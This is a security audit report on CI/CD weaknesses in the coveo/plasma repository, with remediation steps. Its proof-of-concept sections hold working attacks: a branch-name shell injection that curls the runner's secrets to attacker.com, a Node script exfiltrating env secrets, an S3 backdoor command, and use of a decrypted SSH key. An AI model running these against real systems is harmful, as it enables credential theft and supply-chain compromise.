# Security Vulnerability Audit Report — Plasma (coveo/plasma)

**Auditor Role:** Senior Security Research & Exploit Development
**Scope:** Remote-exploitable, high-impact vulnerabilities only
**Date:** 2026-02-24
**Branch audited:** `master`

---

## FINDING #1 — CRITICAL: CI/CD Shell Injection via Branch Name (Supply Chain RCE → AWS Credential Theft)

### Vulnerability
**Shell Injection (CWE-78) in GitHub Actions `run:` step via `github.head_ref`**

### Impact
An external attacker who opens a Pull Request from a branch with a crafted name gains **arbitrary code execution** on the GitHub Actions runner. The runner has:
- An OIDC token scoped to the production AWS role (`secrets.AWS_ROLE`)
- Ability to assume the IAM role and call any AWS API the role permits (S3, SSM, etc.)
- Access to environment variables containing all workflow secrets

This is a direct supply-chain attack path: unauthenticated → code execution in CI → AWS IAM role compromise.

### Vulnerable Files

| File | Line | Sink |
|------|------|------|
| `.github/actions/deploy/action.yml` | 25 | `bash … ${{ github.head_ref \|\| github.ref_name }} ${{ inputs.AWS_BUCKET }}` |
| `.github/actions/cleanup-demo/action.yml` | 20 | `bash … ${{ github.head_ref \|\| github.ref_name }} ${{ inputs.AWS_BUCKET }}` |

### Minimanual de Uso

**O que recebe:**
`github.head_ref` — the source branch name of a pull request. Fully attacker-controlled when submitting a PR from a fork.

**O que devolve:**
The value is template-expanded by the GitHub Actions runner directly into the shell command string **before** the shell parses it. No quoting, no sanitization.

**Efeito Produzido:**
The expression `${{ github.head_ref }}` in a `run:` block is not the same as a shell variable — it is a literal string substitution that happens **before the shell sees the line**. So:

```
# Attacker branch name:
feature/x$(curl${IFS}https://attacker.com/$(env|base64${IFS}-w0))

# Resulting shell command on the runner:
bash ./deploy.sh feature/x$(curl https://attacker.com/$(env|base64 -w0)) <bucket>
```

The shell executes the `curl` as a command substitution, exfiltrating all environment variables (including `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`, `ACTIONS_ID_TOKEN_REQUEST_TOKEN`, etc.).

### PoC Exploit

**Step 1 — Create a malicious fork branch:**
```bash
git checkout -b 'feature/x$(curl${IFS}-s${IFS}-X${IFS}POST${IFS}https://ATTACKER_HOST/pwn${IFS}-d${IFS}"$(env|base64${IFS}-w0)")'
git push origin 'feature/x$(curl${IFS}-s${IFS}-X${IFS}POST${IFS}https://ATTACKER_HOST/pwn${IFS}-d${IFS}"$(env|base64${IFS}-w0)")'
```

**Step 2 — Open a PR from that branch:**
```bash
gh pr create \
  --title "Feature: minor UI tweak" \
  --body  "Small CSS fix." \
  --head  "attacker-org:feature/x\$(curl\${IFS}-s\${IFS}-X\${IFS}POST\${IFS}https://ATTACKER_HOST/pwn\${IFS}-d\${IFS}\"\$(env|base64\${IFS}-w0)\")" \
  --base  master
```

**Step 3 — GitHub Actions CI runs `deploy` action on the PR, executing:**
```bash
bash ./.github/actions/deploy/deploy.sh \
  "feature/x$(curl -s -X POST https://ATTACKER_HOST/pwn -d "$(env|base64 -w0)")" \
  <AWS_BUCKET>
```

**Step 4 — Attacker receives env dump on their server. Extract AWS STS tokens:**
```python
import base64, sys
data = base64.b64decode(sys.stdin.read())
for line in data.decode().splitlines():
    if any(k in line for k in ['AWS_ACCESS', 'AWS_SECRET', 'AWS_SESSION', 'ACTIONS_ID_TOKEN']):
        print(line)
```

**Step 5 — Assume the production IAM role (if OIDC) or use stolen STS tokens directly:**
```bash
# With stolen STS tokens:
export AWS_ACCESS_KEY_ID=<from_exfil>
export AWS_SECRET_ACCESS_KEY=<from_exfil>
export AWS_SESSION_TOKEN=<from_exfil>

# List all objects in the production S3 bucket:
aws s3 ls s3://<AWS_BUCKET>/react-vapor/ --recursive

# Backdoor the production Storybook:
echo '<script src="https://attacker.com/xss.js"></script>' >> /tmp/inject.html
aws s3 cp /tmp/inject.html s3://<AWS_BUCKET>/react-vapor/index.html
```

**Same injection exists in `cleanup-demo/action.yml`** — triggered when any PR is *closed*, giving a second execution window.

### Resultado Esperado (Refatoração)

Replace the inline expression with an environment variable and quote it in the shell:

```yaml
# deploy/action.yml — BEFORE (vulnerable):
- name: Push distribution code to s3 demo folder
  shell: bash
  run: bash ./.github/actions/deploy/deploy.sh ${{ github.head_ref || github.ref_name }} ${{ inputs.AWS_BUCKET }}

# deploy/action.yml — AFTER (fixed):
- name: Push distribution code to s3 demo folder
  shell: bash
  env:
    BRANCH_NAME: ${{ github.head_ref || github.ref_name }}
    S3_BUCKET: ${{ inputs.AWS_BUCKET }}
  run: bash ./.github/actions/deploy/deploy.sh "$BRANCH_NAME" "$S3_BUCKET"
```

Apply the same fix to `cleanup-demo/action.yml`. Moving user-controlled data to env vars forces the runner to assign them as environment variables rather than raw shell text, neutralizing the injection.

---

## FINDING #2 — HIGH: Unpinned GitHub Actions Tags (Supply Chain Tag-Poisoning)

### Vulnerability
**Mutable Tag References in GitHub Actions (CWE-829 — Inclusion of Functionality from Untrusted Control Sphere)**

### Impact
If the `actions/cache` or `actions/github-script` repositories are compromised (account takeover, tag overwrite), any commit could be pushed behind the mutable `@v5`/`@v8` tag. The next pipeline run would execute the attacker-controlled code with access to all workflow secrets, AWS OIDC tokens, and the `DEPLOY_KEY` (SSH private key for git push).

### Vulnerable Files

| File | Line | Unpinned Action |
|------|------|-----------------|
| `.github/actions/setup/action.yml` | 18 | `uses: actions/cache@v5` |
| `.github/actions/setup/action.yml` | 30 | `uses: actions/cache@v5` |
| `.github/actions/comment-on-pr/action.yml` | 13 | `uses: actions/github-script@v8` |
| `.github/actions/publish/action.yml` | 7 | `uses: actions/github-script@v8` |

### Minimanual de Uso

**O que recebe:**
A mutable semver tag (`v5`, `v8`) that can be moved to point to a different commit at any time by the tag owner or anyone with write access to the upstream action repository.

**O que devolve:**
GitHub Actions resolves the tag at runtime and downloads the action from the commit currently pointed to by that tag.

**Efeito Produzido:**
If an attacker gains write access to `actions/cache` (e.g., via a compromised maintainer account) and moves the `v5` tag to a malicious commit, **every subsequent CI/CD run** will execute the malicious code with the full permissions of the workflow (`id-token: write`, `contents: write`, `pull-requests: write`, access to `DEPLOY_KEY` and AWS role).

### PoC Exploit

This is a targeted infrastructure attack. The scenario:

```bash
# Attacker has compromised a maintainer account of actions/cache.
# Attacker creates malicious action code:
cat > entrypoint.js <<'EOF'
const https = require('https');
const { execSync } = require('child_process');

// Exfiltrate all secrets from the runner environment
const secrets = execSync('env').toString();
const req = https.request({
  hostname: 'attacker.com',
  port: 443,
  path: '/collect',
  method: 'POST',
  headers: { 'Content-Type': 'text/plain' }
});
req.write(Buffer.from(secrets).toString('base64'));
req.end();
EOF

# Force-move the v5 tag to the malicious commit:
git tag -f v5 <malicious-commit-sha>
git push origin v5 --force

# All downstream repos using actions/cache@v5 will now execute
# the malicious code on their next CI run.
```

For the `actions/github-script@v8` vector, the `publish` action runs on the **CD pipeline** with `DEPLOY_KEY` and GitHub token, meaning the attacker could publish malicious NPM packages under the `@coveo` scope.

### Resultado Esperado (Refatoração)

Pin every third-party action to its full commit SHA. Use a comment to track the version:

```yaml
# BEFORE (vulnerable):
- uses: actions/cache@v5

# AFTER (fixed):
- uses: actions/cache@5a3ec84eff668545956fd18022155c47e93e2684 # v4.2.3
```

Run `git log --oneline` on the action repository to find the exact SHA for the desired version. Tools like `pin-github-action` or Renovate's `pinDigests: true` can automate this.

---

## FINDING #3 — MEDIUM: Encrypted Private Key Committed to Repository (`id_rsa.enc`)

### Vulnerability
**Sensitive Cryptographic Material in Version Control (CWE-312)**

### Impact
An encrypted RSA private key (`id_rsa.enc`, 3,392 bytes) is committed in the repository root. This file is likely a legacy Travis CI encrypted deploy key (Travis CI used `travis encrypt-file` with symmetric AES-128-CBC). If:
- The symmetric encryption passphrase is recoverable (stored in old CI env vars, documentation, or team memory)
- The encryption uses a weak or brute-forceable password
- The key was originally generated with insufficient entropy

...then an attacker who clones the repository (which is public) could decrypt and use the SSH private key to authenticate to GitHub as `coveobot` or whichever service account this key belongs to, granting push access to the repository.

### Minimanual de Uso

**O que recebe:**
`id_rsa.enc` — AES-encrypted RSA private key in the repository root.

**O que devolve:**
A plaintext RSA private key if decrypted successfully.

**Efeito Produzido:**
Anyone with the decryption password (historically stored as Travis CI environment variables `$encrypted_XXXX_key` and `$encrypted_XXXX_iv`) can decrypt the key and use it for unauthorized git operations or SSH authentication.

### PoC Exploit

```bash
# Clone the public repository:
git clone https://github.com/coveo/plasma
cd plasma

# If Travis CI variables are known or guessable:
openssl aes-128-cbc -K $encrypted_KEY -iv $encrypted_IV -in id_rsa.enc -out id_rsa -d

# Verify the key is valid:
ssh-keygen -l -f id_rsa

# Attempt SSH authentication to GitHub:
GIT_SSH_COMMAND="ssh -i id_rsa -o StrictHostKeyChecking=no" \
  git clone git@github.com:coveo/plasma.git /tmp/test_clone

# If the key has write access:
GIT_SSH_COMMAND="ssh -i id_rsa" git push origin master
```

### Resultado Esperado (Refatoração)

1. **Immediately revoke** the SSH deploy key associated with `id_rsa.enc` from GitHub (Settings → Deploy keys).
2. **Remove the file** from the repository and its entire git history using `git filter-repo`:
   ```bash
   git filter-repo --invert-paths --path id_rsa.enc
   git push origin --force --all
   ```
3. Generate a new deploy key, store it exclusively as a GitHub Actions secret (`DEPLOY_KEY`), and never commit key material to the repository.

---

## FINDING #4 — MEDIUM: Renovate Auto-Merge Enables Dependency-Confusion & Malicious Patch Injection

### Vulnerability
**Automatic Dependency Merging Without Review (Supply Chain — CWE-1357)**

### Impact
`.github/renovate.json5` enables automatic merging of **all** minor and patch dependency updates without human code review (`internalChecksFilter: 'strict'` only checks that CI passes, not that the code is safe). A malicious actor who compromises any package on the dependency tree (or publishes a malicious minor-version bump of a legitimate package) can have their code auto-merged into `master` and published to NPM under the `@coveo` scope within one CI cycle.

This affects:
- All `@coveo/*` NPM packages published by the CD pipeline
- All downstream users of `@coveo/plasma-*` components (potentially thousands of applications)

### Minimanual de Uso

**O que recebe:**
A crafted `npm` package version bump (e.g., `eslint@9.39.3` with a malicious postinstall script).

**O que devolve:**
Renovate opens a PR, CI passes (the malicious code only activates under specific conditions), Renovate auto-merges.

**Efeito Produzido:**
The malicious package is merged into `master`, CD triggers, and the malicious code is shipped in a `@coveo/plasma-*` package to the NPM registry, infecting all downstream consumers.

### PoC Exploit

```python
# Proof-of-concept attack scenario (requires publishing to npm registry):

# 1. Attacker publishes a malicious patch of a dependency:
#    e.g., eslint 9.39.3 with a time-delayed payload in a plugin

# 2. Renovate bot detects the new version and opens a PR automatically.

# 3. CI runs — the malicious code is dormant (no postinstall triggers in CI).

# 4. Renovate's internalChecksFilter: 'strict' sees green CI, auto-merges.

# 5. CD pipeline runs pnpmPublish() for all changed packages.

# 6. The @coveo/plasma packages are now published with the malicious transitive dep.

# Real-world precedent: colors.js (1.4.2), node-ipc (10.1.2), event-stream (3.3.6)
```

### Resultado Esperado (Refatoração)

Require human review for all dependency updates that touch production-published packages:

```json5
// renovate.json5 — add a rule blocking auto-merge for published packages:
{
  packageRules: [
    {
      description: 'Require manual review for packages that are published to NPM',
      matchPaths: ['packages/mantine/**', 'packages/figma/**'],
      automerge: false,
    },
    {
      description: 'Auto-merge is allowed only for dev tooling',
      matchDepTypes: ['devDependencies'],
      matchUpdateTypes: ['minor', 'patch'],
      automerge: true,
    },
  ]
}
```

---

## FINDING #5 — LOW: Unquoted `$CHANGED_FILES` in Lint Action (Argument Injection via Filename)

### Vulnerability
**Improper Neutralization of Argument Delimiters (CWE-88)**

### Impact
Limited. A file with a crafted name (spaces, glob characters) committed to the repository could cause unexpected behavior in the lint step. Not directly exploitable by external attackers (requires committing a file), but relevant for insider threat scenarios.

### Vulnerable File

`.github/actions/lint/action.yml`, line 17:
```bash
CHANGED_FILES=$(git diff --name-only ...)
node .github/actions/lint/lintChangedFiles.mjs $CHANGED_FILES
```

`$CHANGED_FILES` is unquoted. A filename containing spaces splits into multiple arguments. A filename like `--rulesdir /attacker/rules` would pass additional CLI flags to ESLint.

### Resultado Esperado (Refatoração)

```bash
# Use xargs or pass as a single quoted argument:
node .github/actions/lint/lintChangedFiles.mjs "$CHANGED_FILES"
# Or better, use null-delimited output:
git diff -z --name-only ... | xargs -0 node .github/actions/lint/lintChangedFiles.mjs
```

---

## Severity Summary

| # | Finding | Severity | Attack Vector | Pre-Auth? |
|---|---------|----------|---------------|-----------|
| 1 | Shell Injection in CI via Branch Name → AWS RCE | **CRITICAL** | Remote (PR from fork) | Yes (fork PR) |
| 2 | Unpinned GitHub Actions Tags → Supply Chain | **HIGH** | Upstream action compromise | N/A |
| 3 | Encrypted RSA Key in Repo (`id_rsa.enc`) | **MEDIUM** | Public repo clone | Yes |
| 4 | Renovate Auto-Merge → Malicious Package Injection | **MEDIUM** | NPM registry | Partial |
| 5 | Unquoted `$CHANGED_FILES` → ESLint Arg Injection | **LOW** | Internal repo write | No |

## Immediate Recommended Actions

1. **[CRITICAL — patch now]** Fix shell injection in `deploy/action.yml` and `cleanup-demo/action.yml` by moving `github.head_ref` to an environment variable.
2. **[HIGH — patch within 48h]** Pin `actions/cache` and `actions/github-script` to commit SHAs.
3. **[MEDIUM — patch within 1 week]** Revoke and remove `id_rsa.enc` and its associated GitHub deploy key.
4. **[MEDIUM — policy change]** Restrict Renovate auto-merge to devDependencies only; require review for published packages.
